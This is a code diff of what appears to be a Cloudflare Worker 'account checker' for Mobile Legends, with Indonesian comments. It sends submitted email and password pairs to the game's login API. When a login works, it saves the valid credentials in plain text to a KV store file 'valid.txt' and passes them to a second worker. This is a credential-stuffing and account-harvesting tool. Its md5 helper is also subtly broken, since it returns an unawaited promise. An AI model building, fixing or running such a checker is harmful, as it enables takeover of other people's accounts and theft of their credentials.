@@ -1,62 +1,58 @@
+const ALLOWED_ORIGIN = "https://mlbb-checker-validator.pages.dev/"; // domain frontend
+const API_URL = "https://accountmtapi.mobilelegends.com/"; // API MLBB
+
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
 
-    // CORS preflight
+    // Handle CORS preflight
     if (request.method === "OPTIONS") {
       return new Response(null, {
         status: 204,
         headers: {
-          "Access-Control-Allow-Origin": "*",
-          "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
+          "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
+          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
           "Access-Control-Allow-Headers": "Content-Type",
+          "Access-Control-Max-Age": "86400",
         },
       });
     }
 
-    if (url.pathname === "/check" && request.method === "POST") {
+    if (request.method === "POST" && url.pathname === "/check") {
       try {
         const { email, password, captcha_token } = await request.json();
+
         if (!email || !password || !captcha_token) {
           return Response.json({ error: "Missing parameters" }, { status: 400 });
         }
 
-        // Format body jadi x-www-form-urlencoded
-        const params = new URLSearchParams();
-        params.append("email", email);
-        params.append("password", password);
-        params.append("captcha", captcha_token);
-
-        // Kirim request ke API MLBB
-        const mlbbRes = await fetch("https://accountmtapi.mobilelegends.com/", {
+        // Request ke API MLBB
+        const res = await fetch(API_URL, {
           method: "POST",
           headers: {
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 12; Mobile)",
-            "Accept": "*/*",
-            "Connection": "keep-alive",
+            "User-Agent": "Mozilla/5.0",
           },
-          body: params.toString(),
+          body: new URLSearchParams({
+            account: email,
+            md5pwd: md5(password),
+            op: "login",
+            captcha: captcha_token,
+            // param lain sesuai API MLBB sebelumnya
+          }),
         });
 
-        if (!mlbbRes.ok) {
-          return Response.json(
-            { error: `MLBB API error: ${mlbbRes.status}` },
-            { status: mlbbRes.status }
-          );
-        }
+        const data = await res.json();
 
-        const data = await mlbbRes.json();
-
-        // Jika akun valid
+        // Jika valid
         if (data.code === 0) {
           const line = `${email}|${password}\n`;
 
-          // Simpan ke KV sementara
-          if (env.VALID_ACCOUNT) {
-            let old = (await env.VALID_ACCOUNT.get("valid.txt")) || "";
+          // Simpan sementara di KV
+          if (env.VALID_ACCOUNTS) {
+            let old = (await env.VALID_ACCOUNTS.get("valid.txt")) || "";
             old += line;
-            await env.VALID_ACCOUNT.put("valid.txt", old);
+            await env.VALID_ACCOUNTS.put("valid.txt", old);
           }
 
           // Kirim ke Worker B
@@ -76,18 +72,31 @@ export default {
           }
         }
 
-        return Response.json(data, {
-          headers: { "Access-Control-Allow-Origin": "*" },
+        return new Response(JSON.stringify(data), {
+          status: 200,
+          headers: { "Access-Control-Allow-Origin": ALLOWED_ORIGIN },
         });
 
       } catch (err) {
-        return Response.json({ error: err.message }, { status: 500 });
+        return new Response(JSON.stringify({ error: err.message }), {
+          status: 500,
+          headers: { "Access-Control-Allow-Origin": ALLOWED_ORIGIN },
+        });
       }
     }
 
     return new Response("Worker A aktif", {
       status: 200,
-      headers: { "Access-Control-Allow-Origin": "*" },
+      headers: { "Access-Control-Allow-Origin": ALLOWED_ORIGIN },
     });
   },
 };
+
+// Fungsi MD5 untuk password
+function md5(str) {
+  return crypto.subtle.digest("MD5", new TextEncoder().encode(str)).then(buf => {
+    return Array.from(new Uint8Array(buf))
+      .map(b => b.toString(16).padStart(2, "0"))
+      .join("");
+  });
+}
